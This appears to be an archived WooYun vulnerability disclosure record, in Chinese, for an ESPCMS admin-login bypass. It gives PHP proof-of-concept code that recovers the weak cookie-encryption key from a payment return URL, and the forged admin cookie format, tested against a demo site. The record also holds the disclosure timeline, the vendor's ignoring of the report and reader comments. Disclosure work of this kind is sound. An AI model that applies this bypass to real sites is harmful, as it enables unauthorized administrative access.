{"id": 34692, "wybug_id": "wooyun-2015-098132", "wybug_title": "ESPCMS最新版后台登入绕过DEMO测试", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "roker", "wybug_date": "2015-02-25 09:06", "wybug_open_date": "2015-06-01 09:00", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向公众公开  简要描述： 漏网之鱼，同样是加解密函数，但又与以前不同。 详细说明：  看看加解密函数\nfunction eccode($string, $operation = 'DECODE', $key = '@LFK24s224%@safS3s%1f%', $mcrype = true) {\t\t$result = null;\t\tif ($operation == 'ENCODE') {\t\t\tif (extension_loaded('mcrypt') && $mcrype) {\t\t\t\t$result = $this->encryptCookie($string, $key);\t\t\t} else {\t\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t\t$char = chr(ord($char) + ord($keychar));\t\t\t\t\t$result.=$char;\t\t\t\t}\t\t\t\t$result = base64_encode($result);\t\t\t\t$result = str_replace(array('+', '/', '='), array('-', '_', ''), $result);\t\t\t}\t\t} elseif ($operation == 'DECODE') {\t\t\tif (extension_loaded('mcrypt') && $mcrype) {\t\t\t\t$result = $this->decryptCookie($string, $key);\t\t\t} else {\t\t\t\t$data = str_replace(array('-', '_'), array('+', '/'), $string);\t\t\t\t$mod4 = strlen($data) % 4;\t\t\t\tif ($mod4) {\t\t\t\t\t$data .= substr('====', $mod4);\t\t\t\t}\t\t\t\t$string = base64_decode($data);\t\t\t\tfor ($i = 0; $i < strlen($string); $i++) {\t\t\t\t\t$char = substr($string, $i, 1);\t\t\t\t\t$keychar = substr($key, ($i % strlen($key)) - 1, 1);\t\t\t\t\t$char = chr(ord($char) - ord($keychar));\t\t\t\t\t$result.=$char;\t\t\t\t}\t\t\t}\t\t}\t\treturn $result;\t}\n比以前的多了一句话\nif (extension_loaded('mcrypt') && $mcrype) {\t\t\t\t$result = $this->encryptCookie($string, $key);\n如果存在 mcrypt模块且 $mcrype为true，则调用 encryptCookie进行加密，看到encryptCookie\nfunction encryptCookie($value, $key = '@LFK24s224%@safS3s%1f%') {\t\tif (!$value) {\t\t\treturn false;\t\t}\t\t$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB);\t\t$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);\t\t$crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $value, MCRYPT_MODE_ECB, $iv);\t\treturn trim(base64_encode($crypttext));\t}\nphp自带的 加密函数。。给跪。在对会员，后台等cookie操作进行 加密时 mcrype都是默认为true的，于是乎以前的 方法不行了。但是，在 /interface/ordermain.php这个文件中，发现 加密时，竟然设置了mcrype为false。\nfunction in_read() {............$payobj = new $plugcode();\t\t\t\t$codesn = $this->fun->eccode($plugcode . $read['ordersn'] . $oid, 'ENCODE', db_pscode, FALSE);\t\t\t\t$respondArray = array('code' => $plugcode, 'ordersn' => $read['ordersn'], 'oid' => $oid, 'codesn' => $codesn);\t\t\t\t$return_url = $this->get_link('paybackurl', $respondArray, admin_LNG, 0, 1);..........\n我们可以 将这个 codesn 用以前的方法还原出 key。后台检测管理员权限的代码如下\nif (empty($this->esp_username) || empty($this->esp_adminuserid) || md5(admin_AGENT) != $this->esp_useragent || md5(admin_ClassURL) != $this->esp_softurl)\n用得到的key加密\n1|admin|md5(password)|md5(admin_AGENT)|1|1|md5(admin_ClassURL)\n这个值，即可登入后台了。(password随意，注意admin_AGENT和admin_ClassURL别写错了。 )-----------------------------------------------------------------------------------首先，注册用户，购买个商品，来到查看订单的页面，审查元素，\n\n\nreturn_url=http://demo.ecisp.cn/html/cn/index.php?ac=respond&at=payok&codesn=ls6apsXddYWIjpVlk2eVk5SVkmxiZmpyZ3hoanNsbw&code=alipay&ordersn=ESP-201502240614511702&oid=198\nreturn_url后面的就是我们需要的了。填入 poc，\n$text = \"明文\"; //得到的字符串中，code，ordersn，oid 依次拼接的值$cookie = \"ls6apsXddYWIjpVlk2eVk5SVkmxiZmpyZ3hoanNsbw\"; //cookie$bincookie = base64_decode($cookie);for ($j=0; $j < strlen($text); $j++) { \t\t\techo chr( ord($bincookie[$j]) - ord($text[$j]) );}\n然后 将得到的key\n5b16dd028ac5b2eabab6125A6A88B****\n用encryptCookie加密，\n\n修改 cookie ecisp_admininfo，即可登入后台\n\n   漏洞证明：  如上所述。   修复方案：  不懂为什么要 FALSE。。而且检测登入 最好也检测一下 password吧，不要太信任用户所传输的数据   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-01 09:00 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-03 22:36 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  厂商是放假了么-。-    \n     2015-03-06 10:21 |    \t\tPany自留地 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:29        | 0day just like a joke.)\t\t \n  悲剧。。。    \n     2015-06-01 09:09 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  我是新来的小学生，一年后我能秒榜吗？    \n     2015-06-01 09:10 |    \t\t乌云白帽子 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:4        | 路人甲)\t\t \n  666666    \n     2015-06-01 09:22 |    \t\tGsAn \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | Whoami)\t\t \n  前排占位置~~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}